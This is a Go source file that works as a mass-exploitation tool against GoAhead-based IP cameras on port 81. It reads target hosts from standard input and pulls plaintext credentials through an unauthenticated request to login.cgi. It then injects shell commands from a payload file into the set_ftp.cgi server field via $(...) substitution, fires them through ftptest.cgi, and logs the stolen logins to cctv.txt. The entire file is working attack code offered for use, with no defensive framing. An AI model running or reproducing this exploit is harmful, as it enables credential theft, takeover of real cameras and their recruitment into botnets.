package main

import
(
    "net"
    "fmt"
//    "io/ioutil"
    "os"
    "strings"
    "time"
    "bufio"
    "errors"
    "sync"
)

var group sync.WaitGroup

func retrieve_credentials(host string) (string, string, error) {
    conn, err := net.DialTimeout("tcp", host + ":81", time.Duration(10) * time.Second)
    if err != nil {
        return "", "", err
    }
    defer conn.Close()
    conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
    _, err = conn.Write([]byte("GET login.cgi HTTP/1.1\r\n\r\n"))
    if err != nil {
        return "", "", err
    }
    buf := make([]byte, 1024)
    conn.SetReadDeadline(time.Now().Add(10 * time.Second))
    for {
        _, err = conn.Read(buf)
        if err != nil {
            break
        }
    }
    if !strings.Contains(string(buf), "var login") {
        return "", "", errors.New(fmt.Sprintf("Failed to determine if host is vulnerable - %s", host))
    }
    // Parse the credentials
    ind := strings.Index(string(buf), "var login")
    done := buf[ind:]
    done2 := strings.Trim(string(done), "\r\n")
    split := strings.Split(done2, " ")
    if len(split) <= 1 {
        return "", "", errors.New(fmt.Sprintf("Failed to split the credentials\n"))
    }
    preuser := split[1]
    prepass := split[2]
    preuser = strings.Trim(preuser, "var \r\n")
    prepass = strings.Trim(prepass, "var \r\n")
    username := preuser[11:]
    password := prepass[11:]
    username = strings.Trim(username, "\";")
    password = strings.Trim(password, "\";")
    return username, password, nil
}

func submit_payload(host string, payload string) (bool) {
    conn, err := net.DialTimeout("tcp", host + ":81", time.Duration(10) * time.Second)
    if err != nil {
        return false
    }
    defer conn.Close()
    conn.SetDeadline(time.Now().Add(30 * time.Second))
    _, err = conn.Write([]byte(fmt.Sprintf("%s", payload)))
    if err != nil {
        return false
    }
    return true
}

func submit_payload_wait(host string, payload string) (bool) {
    conn, err := net.DialTimeout("tcp", host + ":81", time.Duration(10) * time.Second)
    if err != nil {
        return false
    }
    defer conn.Close()
    conn.SetDeadline(time.Now().Add(60 * time.Second))
    _, err = conn.Write([]byte(fmt.Sprintf("%s", payload)))
    if err != nil {
        return false
    }
    buf := make([]byte, 1024)
    for {
        _, err := conn.Read(buf)
        if err != nil {
            break
        }
        if len(buf) > 1 {
            if strings.Contains(string(buf), "ok") {
                return true
            }
        }
    }
    return false
}

func run(host string) {
    username, password, err := retrieve_credentials(host)
    if err != nil {
        fmt.Println(err)
        group.Done()
        return
    }
    fmt.Printf("\x1b[1;37mRetrieved credentials \x1b[1;35m[\x1b[1;36mgoahead\x1b[1;35m] \x1b[1;37m - %s:%s:%s\n", username, password, host)
    f, err := os.Open("payload_file")
    if err != nil {
        fmt.Println(err)
        group.Done()
        return
    }
    defer f.Close()
    r := bufio.NewReader(f)
    scan := bufio.NewScanner(r)
    for scan.Scan() {
        fmt.Printf("Sending %s\n", scan.Text())
        ret := submit_payload(host, "GET /set_ftp.cgi?loginuse=" + username + "&loginpas=" + password + "&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28" + scan.Text() + "%29 HTTP/1.1\n\n")
        if !ret {
            fmt.Printf("Failed to send payload1 - %s (timeout?)\n", host)
            group.Done()
            return
        }
        fmt.Printf("Sent payload1 with success - %s\n", host)
        ret2 := submit_payload_wait(host, "GET /ftptest.cgi?loginuse=" + username + "&loginpas=" + password + " HTTP/1.1\n\n")
        if !ret2 {
            fmt.Printf("Failed to sent payload2 - %s (timeout?)\n", host)
            group.Done()
            return
        }
        fmt.Printf("Sent payload2 with success - %s\n", host)
        f, err := os.OpenFile("cctv.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
        if err != nil {
            panic(err)
        }
        defer f.Close()
        s := fmt.Sprintf("%s:%s:%s\n", username, password, host)
        _, err = f.WriteString(s)
        if err != nil {
            panic(err)
        }
    }
    group.Done()
    return
}

func main() {
    i := 0
    for {
        r := bufio.NewReader(os.Stdin)
        scan := bufio.NewScanner(r)
        for scan.Scan() {
            s := strings.Split(scan.Text(), ":")
            fmt.Printf("Received - %s:81\n", s[0])
            go run(s[0])
            i++
            group.Add(1)
        }
    }
}
